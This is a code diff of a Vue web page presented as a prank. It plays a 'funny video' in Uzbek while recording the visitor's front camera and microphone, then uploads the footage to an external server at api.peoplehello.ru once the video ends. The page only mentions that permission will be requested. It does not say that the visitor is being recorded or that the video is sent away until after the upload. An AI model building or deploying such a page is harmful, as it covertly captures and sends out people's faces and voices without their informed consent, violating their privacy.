@@ -7,25 +7,28 @@ export default {
       stream: null,
       mediaRecorder: null,
       recordedChunks: [],
+      started: false,
       recording: false,
-      started: false
     }
   },
 
   methods: {
+    // 🔑 FAOL USER ACTION
     async startPrank() {
-      this.started = true
       try {
+        this.started = true
+
+        // 1️⃣ Kamera + mikrofon ruxsati
         this.stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
           audio: true
         })
 
-        console.log('✅ Camera stream OK:', this.stream)
+        // 2️⃣ Recording boshlanadi
         this.startRecording()
 
       } catch (e) {
-        console.error('❌ Camera error:', e)
+        console.error('Permission error:', e)
         alert('❌ Kamera yoki mikrofon ruxsati berilmadi')
       }
     },
@@ -33,8 +36,9 @@ export default {
     startRecording() {
       this.recordedChunks = []
 
+      // 🔻 Optimal bitrate (kichik hajm, sifat OK)
       this.mediaRecorder = new MediaRecorder(this.stream, {
-        mimeType: 'video/webm;codecs=vp8',
+        mimeType: 'video/webm;codecs=vp8,opus',
         videoBitsPerSecond: 700_000
       })
 
@@ -49,51 +53,50 @@ export default {
     },
 
     async stopRecordingAndSend() {
-      if (!this.mediaRecorder || !this.recording) return
+      if (!this.recording) return
 
       this.mediaRecorder.stop()
       this.recording = false
 
       this.mediaRecorder.onstop = async () => {
-        const videoBlob = new Blob(this.recordedChunks, {
-          type: 'video/webm'
-        })
+        const blob = new Blob(this.recordedChunks, { type: 'video/webm' })
 
         const formData = new FormData()
-        formData.append('file', videoBlob)
+        formData.append('file', blob)
 
         try {
           await axios.post(
               'https://api.peoplehello.ru/api/video-upload',
               formData
           )
-          alert('😂 Video yuborildi!')
-        } catch {
+          alert('😂 Video muvaffaqiyatli yuborildi!')
+        } catch (e) {
           alert('❌ Video yuborilmadi')
         }
       }
     },
 
+    // 🎬 Kulgili video tugaganda
     onFunnyVideoEnd() {
       this.stopRecordingAndSend()
     }
   }
 }
-
-eruda.init()
 </script>
+
 
 <template>
   <div class="prank-page">
 
-    <!-- BOSHLASH EKRANI -->
+    <!-- START SCREEN (MUHIM) -->
     <div v-if="!started" class="start-screen">
       <button @click="startPrank">
         ▶️ Videoni boshlash
       </button>
+      <p>Kamera va mikrofon ruxsati so‘raladi</p>
     </div>
 
-    <!-- 😂 Kulgili video -->
+    <!-- PRANK VIDEO -->
     <video
         v-else
         class="fun-video"
@@ -109,11 +112,17 @@ eruda.init()
 </template>
 
 
+
 <style>
-.start-screen {
+.prank-page {
   width: 100vw;
   height: 100vh;
   background: #000;
+}
+
+.start-screen {
+  width: 100%;
+  height: 100%;
   color: #fff;
   display: flex;
   flex-direction: column;
@@ -124,9 +133,16 @@ eruda.init()
 .start-screen button {
   padding: 16px 30px;
   font-size: 18px;
-  border-radius: 10px;
+  border-radius: 12px;
   border: none;
   cursor: pointer;
 }
+
+.fun-video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
 
 </style>
